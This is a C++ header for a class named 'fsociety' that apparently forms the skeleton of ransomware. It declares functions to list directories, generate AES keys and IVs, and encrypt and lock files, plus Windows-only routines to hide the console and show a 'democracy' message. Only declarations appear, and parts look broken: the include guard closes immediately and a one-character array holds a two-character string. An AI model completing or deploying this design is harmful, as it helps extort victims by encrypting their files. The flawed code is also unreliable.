#ifndef __FSOCIETY_H__
#define __FSOCIETY_H__
#endif
#include "dirent.h"
#include<cstring>
#include <string.h>

#include "cryptopp/osrng.h"
#include "cryptopp/modes.h"
#include "cryptopp/aes.h"

void DisplayErrorBox(const char* lpszFunction);

class fsociety
{
    public:
	int listfiledirectory(char *);
	int is_directory(char *);
	int open_file(char *);
	int nb_file = 0;
	CryptoPP::byte* generate_iv(void);
	CryptoPP::byte* generate_key(void);
	CryptoPP::byte* encrypt(CryptoPP::byte*,CryptoPP::byte*,int,CryptoPP::byte*,int);
	CryptoPP::byte* decrypt(CryptoPP::byte*,CryptoPP::byte*,int,CryptoPP::byte*,int);
	CryptoPP::byte* fucksociety(char*);
	CryptoPP::byte* get_secret_key(void);
	CryptoPP::byte* get_secret_iv(void);
	CryptoPP::byte* secret_key;
	CryptoPP::byte* secret_iv;
	int encrypt_file(char *, const char *);
	std::string number_to_string(int);	
	int lock_file(char *);

	std::string cipher;

	#if defined(WIN32)
		const char slash[3] = "\\";
	    int show_democracy(void);
	    int hide_console(void);
	#else
		const char slash[1] = "/";
	#endif
};
